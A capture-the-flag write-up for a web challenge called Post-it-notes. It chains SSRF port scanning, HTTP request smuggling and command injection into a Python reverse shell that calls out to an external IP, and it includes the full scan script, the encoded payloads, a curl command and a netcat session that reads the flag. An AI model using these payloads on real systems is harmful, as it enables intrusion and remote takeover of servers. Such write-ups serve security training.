# Post-it-notes

It looks like we can do request smuggling/SSRF on the check-links route.  First lets find which port the api server is running on via SSRF

```python
import requests

for port in range(50000, 51001):
    r = requests.post("http://2020.redpwnc.tf:31957/check-links", data = {
        'links': 'http://localhost:' + str(port)
    },  proxies={'http':'http://127.0.0.1:8080'})
    if ("true" in r.text):
        print("Port is " + str(port))
        break
```

And when we run it

```shell-session
╭─zoey@nomadic ~/sec/redpwnctf/post-it-notes 
╰─$ python find-api-server.py                           
Port is 50528
```

Now lets try the request smuggling so we can send a GET request to `/api/v1/notes/`.  The following request will still pass the regular expressions, while
allowing us to perform request smuggling.  We can test on our local server.

```
http://127.0.0.1

GET /api/v1/notes/?title=test HTTP/1.1

:50528/
```

Now let's compose something for the command injection.  We already know we have python so lets setup a reverse shell with it.  Our request now becomes

```
http://127.0.0.1

GET /api/v1/notes/?title='||python%20%2Dc%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%22136%2E24%2E87%2E77%22%2C22473%29%29%3Bos%2Edup2%28s%2Efileno%28%29%2C0%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C1%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C2%29%3Bp%3Dsubprocess%2Ecall%28%5B%22%2Fbin%2Fsh%22%2C%22%2Di%22%5D%29%3B%27||echo+' HTTP/1.1

:50528/
```

Lets setup a netcat listener, then URL encode the payload and send it along

```
curl -i -s -k -X $'POST' \
    -H $'Host: 2020.redpwnc.tf:31957' -H $'User-Agent: python-requests/2.23.0' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: */*' -H $'Connection: close' -H $'Content-Length: 653' -H $'Content-Type: application/x-www-form-urlencoded' \
    --data-binary $'links=http%3A%2F%2F127%2E0%2E0%2E1%0A%0AGET%20%2Fapi%2Fv1%2Fnotes%2F%3Ftitle%3D%27%7C%7Cpython%2520%252Dc%2520%2527import%2520socket%252Csubprocess%252Cos%253Bs%253Dsocket%252Esocket%2528socket%252EAF%255FINET%252Csocket%252ESOCK%255FSTREAM%2529%253Bs%252Econnect%2528%2528%2522136%252E24%252E87%252E77%2522%252C22473%2529%2529%253Bos%252Edup2%2528s%252Efileno%2528%2529%252C0%2529%253B%2520os%252Edup2%2528s%252Efileno%2528%2529%252C1%2529%253B%2520os%252Edup2%2528s%252Efileno%2528%2529%252C2%2529%253Bp%253Dsubprocess%252Ecall%2528%255B%2522%252Fbin%252Fsh%2522%252C%2522%252Di%2522%255D%2529%253B%2527%7C%7Cecho%2B%27%20HTTP%2F1%2E1%0A%0A%3A50528%2F' \
    $'http://2020.redpwnc.tf:31957/check-links'
```

And on our listener:

```shell-session
╭─zoey@nomadic ~/sec/redpwnctf/panda-facts 
╰─$ nc -lvp 22473
listening on [any] 22473 ...
connect to [192.168.100.224] from 250.191.75.34.bc.googleusercontent.com [34.75.191.250] 593
66
/bin/sh: 0: can't access tty; job control turned off
$ ls
api
flag.txt
main.py
notes
notes.py
web
$ cat flag.txt
flag{y0u_b3tt3r_n0t_m@k3_m3_l0s3_my_pyth0n_d3v_j0b}
```